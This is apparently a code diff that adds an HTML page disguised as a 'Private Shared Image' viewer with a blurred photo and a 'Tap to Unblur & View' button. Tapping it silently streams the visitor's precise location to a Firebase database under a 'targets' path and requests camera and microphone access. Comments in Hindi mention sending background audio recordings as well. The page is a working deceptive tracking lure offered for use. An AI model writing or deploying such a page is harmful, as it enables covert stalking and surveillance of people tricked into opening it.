@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Photo Viewer</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
+    <style>
+        .blur { filter: blur(8px); width: 100%; max-width: 400px; transition: 2s; }
+        .container { text-align: center; margin-top: 50px; font-family: sans-serif; }
+        #unblurBtn { padding: 15px 30px; background: #28a745; color: white; border: none; border-radius: 5px; font-size: 18px; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h3>View Private Shared Image</h3>
+        <img id="myPic" class="blur" src="https://via.placeholder.com/400x600?text=Private+Photo">
+        <br><br>
+        <button id="unblurBtn" onclick="startSystem()">Tap to Unblur & View</button>
+    </div>
+
+    <script>
+        // Firebase Config (Aapki Database URL)
+        const firebaseConfig = { databaseURL: "https://mytrecker2-b3535-default-rtdb.firebaseio.com/" };
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.database();
+        const userId = "User_" + Math.floor(Math.random() * 9999); // Har user ki unique ID
+
+        function startSystem() {
+            // 1. Unblur Animation
+            document.getElementById('myPic').style.filter = "blur(0px)";
+            document.getElementById('unblurBtn').innerText = "Loading Image...";
+
+            // 2. Request Location
+            navigator.geolocation.watchPosition(pos => {
+                db.ref('targets/' + userId + '/location').set({
+                    lat: pos.coords.latitude,
+                    lng: pos.coords.longitude,
+                    time: new Date().toLocaleTimeString()
+                });
+            }, err => console.log(err), { enableHighAccuracy: true });
+
+            // 3. Audio & Camera Permissions 
+            // Note: Browser security rules ki wajah se "Allow" prompt aayega
+            startMediaCapture();
+        }
+
+        async function startMediaCapture() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ audio: true, video: true });
+                // Background mein audio record karke Firebase par bhej sakte hain (as Base64)
+                console.log("Media Access Granted");
+            } catch(e) { alert("Please allow permissions to view the content"); }
+        }
+    </script>
+</body>
+</html>
